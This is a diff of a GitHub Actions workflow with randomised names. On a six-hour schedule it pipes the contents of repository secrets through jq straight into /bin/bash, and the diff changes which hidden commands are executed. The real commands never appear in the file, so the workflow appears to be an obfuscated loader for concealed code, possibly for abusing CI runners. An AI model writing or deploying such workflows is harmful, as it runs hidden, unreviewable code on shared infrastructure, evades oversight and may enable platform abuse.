@@ -2,24 +2,17 @@ name: laimouli2197
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 0/6 * * *'
+    - cron: '2 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: laimouli2197
         env:
-          hx7: ${{ secrets.hx7 }}
+          xtjey63397: ${{ secrets.xtjey63397 }}
         run: |
-          echo $hx7 | jq -r .lppn25 | /bin/bash
-          echo $twwf31641 | jq -r .jqtzd2 | /bin/bash
-          echo $be7 | jq -r .awon930 | /bin/bash
-          echo $gy02 | jq -r .rtbo25 | /bin/bash
-          echo $boa8424 | jq -r .hmas7 | /bin/bash
-          echo $q65410 | jq -r .kbbyj501 | /bin/bash
-          echo $nfq59 | jq -r .ka4510 | /bin/bash
-          echo $vnkv8 | jq -r .fp166 | /bin/bash
-          echo $crtc22 | jq -r .lrwx9706 | /bin/bash
+          echo $xtjey63397 | jq -r .frcah262 | /bin/bash
+          echo $pnrg952 | jq -r .q3 | /bin/bash
 
